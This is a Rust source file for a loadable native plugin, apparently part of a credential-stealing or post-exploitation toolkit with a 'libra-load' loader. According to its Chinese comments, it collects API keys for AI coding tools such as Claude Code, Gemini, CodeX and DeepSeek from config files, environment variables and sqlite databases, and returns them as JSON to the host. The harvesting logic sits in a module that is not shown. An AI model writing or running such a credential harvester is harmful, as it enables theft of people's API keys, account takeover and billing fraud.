//! AI 软件 API Key 插件 — 独立 native 插件（cdylib）。
//!
//! 复用 creds 模块的 AITokenScanner 逻辑：扫描 Claude Code / OpenCode /
//! MimoCode / CodeX / Gemini / OpenClaw / Hermes / CC Switch / DeepSeek
//! Harness 的 API Key（配置文件 + 环境变量 + sqlite）。
//!
//! ABI（libra-load）：
//!   module_name() -> *const u8
//!   module_main(input, input_len, output, output_cap) -> usize

mod ai_token_scanner;

/// 自识别名（必须与插件 meta.json 的 module.name 一致）。
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("aitoken", "\0").as_ptr() as *const u8
}

/// 入口：忽略输入（本插件无参数），返回 AI Key 扫描结果 JSON。
#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let _ = (input, input_len);
    let result = ai_token_scanner::AITokenScanner::scan();
    write_output(&result, output, output_cap)
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe {
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
        }
    }
    n
}
